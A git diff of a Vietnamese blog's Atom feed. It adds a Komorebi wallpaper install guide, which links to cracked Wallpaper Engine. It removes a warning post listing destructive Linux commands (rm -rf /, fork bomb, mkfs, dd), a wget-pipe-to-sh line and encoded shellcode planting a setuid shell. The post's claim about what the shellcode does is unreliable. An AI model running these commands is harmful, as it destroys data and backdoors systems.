@@ -1,4 +1,77 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-15T21:15:21+07:00</updated><id>http://localhost:4000/feed.xml</id><entry><title type="html">Hướng dẫn về Plugins SourceMode (Part 2)</title><link href="http://localhost:4000/sourcemods/huong-dan-cai-dat-SourceMode-vao-CS-Source.html" rel="alternate" type="text/html" title="Hướng dẫn về Plugins SourceMode (Part 2)" /><published>2020-08-09T00:00:00+07:00</published><updated>2020-08-09T00:00:00+07:00</updated><id>http://localhost:4000/sourcemods/huong-dan-viet-plugin-part-2</id><content type="html" xml:base="http://localhost:4000/sourcemods/huong-dan-cai-dat-SourceMode-vao-CS-Source.html">&lt;p&gt;&lt;img src=&quot;/image/SourceMod/202089SourceModLogo.png&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-04T23:29:46+07:00</updated><id>http://localhost:4000/feed.xml</id><entry><title type="html">Komorebi - Animated Wallpapers cho Linux OS</title><link href="http://localhost:4000/komorebi-animated-wallpapers-for-Linux.html" rel="alternate" type="text/html" title="Komorebi - Animated Wallpapers cho Linux OS" /><published>2021-10-04T00:00:00+07:00</published><updated>2021-10-04T00:00:00+07:00</updated><id>http://localhost:4000/komorebi-animated-wallpapers-for-Linux</id><content type="html" xml:base="http://localhost:4000/komorebi-animated-wallpapers-for-Linux.html">&lt;p&gt;&lt;img src=&quot;../image/komorebi-animated-wallpapers-for-Linux.png&quot; alt=&quot;image&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;strong&gt;Để có thể một hình nền động tuyệt đẹp trên desktop chạy hệ điều hành Windows của &lt;a href=&quot;https://www.microsoft.com/vi-vn&quot;&gt;Microssorft&lt;/a&gt; thì chúng ta phải có:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://store.steampowered.com/app/431960/Wallpaper_Engine/&quot;&gt;Wallpapper Engine&lt;/a&gt; : Chú ý để có thể trải nghiệm tốt các tình năng có trên bộ cộng cụ này buộc các bạn phải trả phí mua trên Steam, hoặc bản có thể tải phiên bản crack &lt;a href=&quot;https://linkneverdie.net/software/wallpaper-engine-6879&quot;&gt;tại đây&lt;/a&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/p/lively-wallpaper/9ntm2qc6qws7?activetab=pivot:overviewtab&quot;&gt;Lively Wallpaper&lt;/a&gt; : Bộ công cụ này được miễn phí trên Store của microssoft chạy trên Windows 10, nên các pc hay laptop nào đang sử dụng Windows 10 trở lên đều có thể cài được.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://taimienphi.vn/download-push-video-wallpaper-32846&quot;&gt;Push Video Wallpapper&lt;/a&gt; : Tương tự như 2 bộ công cụ trên đó là dùng để làm ảnh động bằng video cho Desktop và hoàn toàn miễn phí.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Điều đặc biệt trên đó là tất cả phần mềm trên đều được hổ trợ trên Windows, vậy để có thể dùng video làm ảnh động trên các hệ điều hành khác chẳn hạn như HĐH Linux thì sao… ?. Tất nhiên là có thì mình mới viết bài này đăng cho các bạn xem chứ 😂 hihihi, luyên thuyên vậy đủ rồi mình vào chủ đề chính nhen, vậy nó là phần mềm &lt;strong&gt;&lt;a href=&quot;https://github.com/cheesecakeufo/komorebi&quot;&gt;Komorebi&lt;/a&gt;&lt;/strong&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;1-komorebi-là-gì-&quot;&gt;1. Komorebi là gì ?&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;Komorebi&lt;/strong&gt; là một trình quản lý hình nền động tuyệt vời cho tất cả các nền tảng Linux. Nó cung cấp hình nền hình ảnh, video và trang web có thể tùy chỉnh hoàn toàn có thể được tinh chỉnh bất cứ lúc nào!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../image/komorebi-animated-wallpapers-for-Linux-1.png&quot; alt=&quot;image-1&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;2-cài-đặt-và-sử-dụng-komorebi&quot;&gt;2. Cài đặt và sử dụng Komorebi.&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Mở &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Terminal&lt;/code&gt;&lt;/strong&gt; lên bằng cách &lt;kbd&gt;Ctrl + Alt + t&lt;/kbd&gt; và nhập lệnh sau:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Cài đặt các gói cần thiết&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;add-apt-repository ppa:gnome3-team/gnome3 &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;add-apt-repository ppa:vala-team &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;add-apt-repository ppa:gnome3-team/gnome3-staging &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;cmake valac libgtk-3-dev libgee-0.8-dev libclutter-gtk-1.0-dev libclutter-1.0-dev libwebkit2gtk-4.0-dev libclutter-gst-3.0-dev
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Cài đặt komorebi&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;git clone https://github.com/cheesecakeufo/komorebi.git
+&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;komorebi
+&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;build &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build
+&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;cmake .. &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./komorebi
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;3-custom-video-làm-ảnh-nền-cho-desktop&quot;&gt;3. Custom video làm ảnh nền cho desktop&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Komorebi cung cấp một công cụ đơn giản để tạo hình nền của riêng bạn! Đơn giản, mở ứng dụng của bạn và tìm kiếm ‘Trình tạo hình nền’.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../image/komorebi-animated-wallpapers-for-Linux-2.png&quot; alt=&quot;image-2&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;../image/komorebi-animated-wallpapers-for-Linux-3.png&quot; alt=&quot;image-3&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;../image/komorebi-animated-wallpapers-for-Linux-4.png&quot; alt=&quot;image-4&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+Bạn có thể sử dụng hình ảnh, video hoặc trang web làm hình nền và bạn có nhiều tùy chọn khác nhau để tùy chỉnh hình nền của riêng mình!&lt;/p&gt;
+
+&lt;h3 id=&quot;5-gỡ-bỏ-komorebi&quot;&gt;5. Gỡ bỏ komorebi.&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;
+ // Nếu bạn đã cài đặt phiên bản đóng gói của Komorebi
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt remove komorebi
+&lt;span class=&quot;go&quot;&gt; 
+ // Nếu bạn cài đặt thủ công Komorebi
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;komorebi/build
+&lt;span class=&quot;gp&quot;&gt; ~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;make uninstall
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lời kết: Như vậy bạn đó có 1 hình nền desktop động tuyệt đẹp riêng cho chính mình, Bạn nào đã sử dụng rồi thì cho mình ý kiến nhá, và còn bộ công cụ nào hổ trợ làm ảnh động desktop cho linux nữa hay không thì các bạn chỉa sẽ cho mình và người khác cùng biết nhá.&lt;/p&gt;</content><author><name>Pandora</name></author><category term="[&quot;linux&quot;]" /><summary type="html">Komorebi là một trình quản lý hình nền động tuyệt vời cho tất cả các nền tảng Linux.</summary></entry><entry><title type="html">Hướng dẫn về Plugins SourceMode (Part 2)</title><link href="http://localhost:4000/sourcemods/huong-dan-cai-dat-SourceMode-vao-CS-Source.html" rel="alternate" type="text/html" title="Hướng dẫn về Plugins SourceMode (Part 2)" /><published>2020-08-09T00:00:00+07:00</published><updated>2020-08-09T00:00:00+07:00</updated><id>http://localhost:4000/sourcemods/huong-dan-viet-plugin-part-2</id><content type="html" xml:base="http://localhost:4000/sourcemods/huong-dan-cai-dat-SourceMode-vao-CS-Source.html">&lt;p&gt;&lt;img src=&quot;/image/SourceMod/202089SourceModLogo.png&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Sau bài viết &lt;a href=&quot;sourcemods/huong-dan-viet-plugin-part-1.html&quot;&gt;hướng dẫn về Plugins SourceMod (Part 1)&lt;/a&gt;, thì trong bài post này mình xin hướng dẫn cách cài đặt SourceMod vào &lt;a href=&quot;https://store.steampowered.com/app/240/CounterStrike_Source/&quot;&gt;Counter-Strike: Source&lt;/a&gt; để có thể sử dụng được Plugins trong game nhá !&lt;/p&gt;
 
@@ -63,7 +136,7 @@
 &lt;center&gt;&lt;img class=&quot;img-thumbnail image-post&quot; src=&quot;/image/SourceMod/logoSpEdit.png&quot; /&gt;&lt;/center&gt;
 &lt;p&gt;&lt;br /&gt;
 Mở trình biên dịch SpEdit.exe lên và khởi tạo một file có đuôi là .sp ví dụ untitle.sp
-Khai báo thư viện như C/C++ sẽ có lệnh như sau: &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;#include 'tên file nguồn'&lt;/code&gt;&lt;/strong&gt;. Để trình biên soạn dẫn và đọc file nguồn để ghi nhớ câu lệnh.&lt;/p&gt;
+Khai báo thư viện như C/C++ sẽ có lệnh như sau: &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;#include &apos;tên file nguồn&apos;&lt;/code&gt;&lt;/strong&gt;. Để trình biên soạn dẫn và đọc file nguồn để ghi nhớ câu lệnh.&lt;/p&gt;
 
 &lt;h2 id=&quot;2thiết-lập-thông-tin-cho-plugins&quot;&gt;2.Thiết lập thông tin cho plugins&lt;/h2&gt;
 &lt;hr /&gt;
@@ -994,99 +1067,4 @@ Dùng để nhúng các nội dung hoặc các ứng dụng bên ngoài vào tra
 
 &lt;hr /&gt;
 
-&lt;p&gt;Nguồn: &lt;a href=&quot;https://techmaster.vn/posts/33804/html5-la-gi-hoc-lap-trinh-web-co-ban-den-nang-cao?fbclid=IwAR06lAmlmuthMOeGKTpoZgLDTOCMJLI02j_ftRBWmUgLqzJHpinSCOGtJw4#toc-html-m-t-c-i-nh-n-t-ng-quan&quot;&gt;techmaster.vn&lt;/a&gt;&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;html&quot;, &quot;unixlinux&quot;, &quot;windows&quot;]" /><summary type="html">Trong vài năm qua, bạn có thể đã nghe người ta nói nhiều về HTML5...</summary></entry><entry><title type="html">Top các câu lệnh nguy hiểm trên linux ban cần chú ý khi sử dụng</title><link href="http://localhost:4000/top-cac-cau-lenh-nguy-hiem-tren-linux-ban-can-chu-y-khi-su-dung.html" rel="alternate" type="text/html" title="Top các câu lệnh nguy hiểm trên linux ban cần chú ý khi sử dụng" /><published>2020-05-25T00:00:00+07:00</published><updated>2020-05-25T00:00:00+07:00</updated><id>http://localhost:4000/top-cac-cau-lenh-nguy-hiem-tren-linux-ban-can-chu-y-khi-su-dung</id><content type="html" xml:base="http://localhost:4000/top-cac-cau-lenh-nguy-hiem-tren-linux-ban-can-chu-y-khi-su-dung.html">&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;550&quot; src=&quot;http://localhost:4000/image/2020525-Caution-Command-Terminal.png&quot; /&gt;&lt;/center&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;Như bạn đã biết, các câu lệnh trong Terminal thực sự rất hữu dụng và giúp cho người sử dụng có thể thao tác cực nhanh mà không cần phải qua GUI rườm rà. Tuy nhiên, nó cũng có nhiều rủi ro nếu như bạn sử dụng nó sai cách hoặc bạn không hề biết bạn đang thực thi câu lệnh có độ nguy hiểm như thế nào đối với hệ thống.&lt;/p&gt;
-
-&lt;p&gt;Bài viết này sẽ sơ lược qua các câu lệnh cực kỳ nguy hiểm cho Linux, nếu các câu lệnh này được thực thi, bạn có thể bị mất toàn bộ dữ liệu trong máy hoặc hệ điều hành sẽ không bao giờ khởi động được nữa.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Xin lưu ý một lần nữa, bài viết này chỉ có tính chất tham khảo, hạn chế hoặc không chạy các câu lệnh bên dưới để tránh tạo rủi ro gây mất mát dữ liệu hoặc hỏng HĐH&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: rm -rf&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Đây là 1 trong những cách nhanh nhất để xoá file và folder, nhưng nếu nhập sai hoặc bạn không hiểu bản chất của câu lệnh này là gì thì sẽ gây ảnh hưởng nặng nề đến hệ thống.&lt;/p&gt;
-
-&lt;p&gt;Một số cách sử dụng câu lệnh này như bên dưới:&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm &amp;lt;tên file&amp;gt;&lt;/code&gt;&lt;/strong&gt; : xoá file cụ thể.&lt;br /&gt;
-&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -r&lt;/code&gt;&lt;/strong&gt; : xoá toàn bộ folder, kể cả folder rỗng.&lt;br /&gt;
-&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -f&lt;/code&gt;&lt;/strong&gt; : bắt buộc xóa file (f ở đây là từ force). Lệnh này bỏ qua các tập tin ko tồn tại và sẽ không hiện ra cảnh báo trước khi xoá. (vì là bắt buộc nên xoá các file &lt;strong&gt;write protected&lt;/strong&gt; và &lt;strong&gt;read only&lt;/strong&gt; luôn).&lt;br /&gt;
-&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -rf /&lt;/code&gt;&lt;/strong&gt; : buộc xoá tất cả mọi thứ trong folder gốc, kể cả folder được bảo vệ.&lt;br /&gt;
-&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -rf *&lt;/code&gt;&lt;/strong&gt; : buộc xoá tất cả mọi thứ trong folder bạn đang làm việc.&lt;br /&gt;
-&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -rf .&lt;/code&gt;&lt;/strong&gt; : buộc xoá tất cả folder hiện tại và sub-folder.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;CÂU LỆNH&amp;gt; &amp;gt;&lt;/code&gt; /dev/sda&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Câu lệnh bên trên sẽ ghi output của &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;CÂU LỆNH&amp;gt;&lt;/code&gt;&lt;/strong&gt; được thực hiện lên ổ cứng (ở đây là /DEV/SDA) và sẽ ghi đè và xóa sổ toàn bộ dữ liệu có sẵn trong đó.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;:(){:|:&amp;amp;};:&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Lệnh này thực chất là 1 quả bom, nó thực thi bằng việc định nghĩa hàm ‘:’ và hàm này tự gọi lại chính nó (đệ quy). Nó sẽ sao chép chính bản thân nó nhiều lần và liên tục, gây tràn bộ nhớ hệ thống, dẫn tới đóng băng hệ thống.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;mv &amp;lt;TÊN FOLDER&amp;gt; /dev/null&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Nếu bạn thực thi lệnh này, nó sẽ di chuyển &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;TÊN FOLDER&amp;gt;&lt;/code&gt;&lt;/strong&gt; đến &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt;&lt;/strong&gt;. Mà nơi này chính là một “lỗ đen” đúng nghĩa. Mọi dữ liệu di chuyển đến đây đều biến mất mãi mãi.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://trang_chua_ma_doc -O- | sh&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Câu lệnh ở trên sẽ tải script từ một trang chữa mã độc và thực thi với lệnh SH&lt;/p&gt;
-
-&lt;p&gt;Hãy chắc chắn bạn tin tưởng với trang web ở trong câu lệnh này, đừng copy, paste và thực thi vô tội vạ các lệnh ở trên mạng.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.ext3 /dev/sda&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Lệnh này thì sẽ format lại toàn bộ dữ liệu trong ổ cứng, dữ liệu chắn chắn sẽ biến mất hoàn toàn khi thực thi nó.&lt;/p&gt;
-
-&lt;p&gt;Một số câu lệnh tương tự dùng để format ổ cứng (cần quyền sudo)&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;mkfs&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;mkfs.ext3&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;mkfs.bfs&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;mkfs.ext2&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;mkfs.minix&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;mkfs.msdos&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;mkfs.reiserfs&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;mkfs.vfat&lt;br /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Riêng mkfs.cramfs tác dụng tương tự như không cần sudo.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt; &amp;lt;FILE&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Xoá toàn bộ nội dung của &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;FILE&amp;gt;&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;^foo^bar&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;được sử dụng để chỉnh sửa lệnh chạy trước đó mà không cần phải gõ lại toàn bộ câu lệnh. Nhưng có thể gây rắc rối nếu bạn không kiểm tra kỹ lưỡng thay đổi trong câu lệnh ban đầu.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/random of=/dev/sda&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Câu lệnh trên sẽ xóa sạch ổ cứng và ghi dữ liệu rác vào. Tất nhiên! Hệ thống của bạn sẽ bị hỏng hoàn toàn và khả năng phục hồi gần như = 0&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;NHỮNG CÂU LỆNH NGUY HIỂM ĐÃ ĐƯỢC MÃ HOÁ&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;char esp[] __attribute__ ((section(“.text”))) /* e.s.p
-release */
-= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
-“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
-“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
-“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
-“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
-“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
-“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
-“cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;”;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Hẳn bạn nghĩ lệnh trên không gây ra vấn đề gì, nhưng không! Lệnh bên trên sẽ xoá phân vùng gốc ổ cứng của bạn.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Bạn tuyệt đối không được copy, paste và thực thi một trong các câu lệnh không rõ nguồn gốc từ Internet để tránh những thiệt hại gây ra cho Linux do sự bất cẩn của bản thân mình.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;~~ Bài viết có kham thảo từ các nguồn uy tín ~~
-P/s: nếu mình có sai sót gì trong bài viết thì mong các bạn góp ý để mình có thể chỉnh sửa bài viết và hoàn thiện nó một cách tốt nhất nhé :)&lt;/p&gt;
-
-&lt;p&gt;Nguồn: &lt;a href=&quot;https://www.facebook.com/groups/linuxteamvietnam2018/permalink/856171831568486/&quot;&gt;Linux Team Việt Nam (Official Group) Post 1&lt;/a&gt;&lt;br /&gt;
-Nguồn: &lt;a href=&quot;https://www.facebook.com/groups/linuxteamvietnam2018/permalink/856981638154172/&quot;&gt;Linux Team Việt Nam (Official Group) Post 2&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr style=&quot;background: #000;&quot; /&gt;</content><author><name>Panadora</name></author><category term="[&quot;unixlinux&quot;, &quot;terminal&quot;]" /><summary type="html">Như bạn đã biết, các câu lệnh trong Terminal thực sự rất hữu dụng và giúp cho người sử dụng có thể thao tác cực nhanh mà không cần phải qua GUI rườm rà.</summary></entry></feed>
+&lt;p&gt;Nguồn: &lt;a href=&quot;https://techmaster.vn/posts/33804/html5-la-gi-hoc-lap-trinh-web-co-ban-den-nang-cao?fbclid=IwAR06lAmlmuthMOeGKTpoZgLDTOCMJLI02j_ftRBWmUgLqzJHpinSCOGtJw4#toc-html-m-t-c-i-nh-n-t-ng-quan&quot;&gt;techmaster.vn&lt;/a&gt;&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;html&quot;, &quot;unixlinux&quot;, &quot;windows&quot;]" /><summary type="html">Trong vài năm qua, bạn có thể đã nghe người ta nói nhiều về HTML5...</summary></entry></feed>
